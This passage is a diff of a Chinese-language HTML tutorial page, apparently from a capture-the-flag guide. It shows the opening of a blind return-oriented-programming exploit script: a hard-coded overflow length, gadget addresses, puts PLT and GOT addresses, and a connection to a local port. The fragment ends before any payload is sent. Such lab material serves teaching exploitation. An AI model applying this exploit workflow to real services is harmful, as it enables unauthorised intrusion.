-<h4>程序利用<a class="headerlink" href="#id22" title="永久链接至标题">¶</a></h4>
-<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1">#length = getbufferflow_length()</span>
+<div class="section" id="id18">
+<h4>程序利用<a class="headerlink" href="#id18" title="永久链接至标题">¶</a></h4>
+<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1">##length = getbufferflow_length()</span>
 <span class="n">length</span> <span class="o">=</span> <span class="mi">72</span>
-<span class="c1">#stop_gadget = get_stop_addr(length)</span>
+<span class="c1">##stop_gadget = get_stop_addr(length)</span>
 <span class="n">stop_gadget</span> <span class="o">=</span> <span class="mh">0x4006b6</span>
-<span class="c1">#brop_gadget = find_brop_gadget(length,stop_gadget)</span>
+<span class="c1">##brop_gadget = find_brop_gadget(length,stop_gadget)</span>
 <span class="n">brop_gadget</span> <span class="o">=</span> <span class="mh">0x4007ba</span>
 <span class="n">rdi_ret</span> <span class="o">=</span> <span class="n">brop_gadget</span> <span class="o">+</span> <span class="mi">9</span>
-<span class="c1">#puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span>
+<span class="c1">##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span>
 <span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x400560</span>
-<span class="c1">#leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span>
+<span class="c1">##leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span>
 <span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x601018</span>
 
 <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
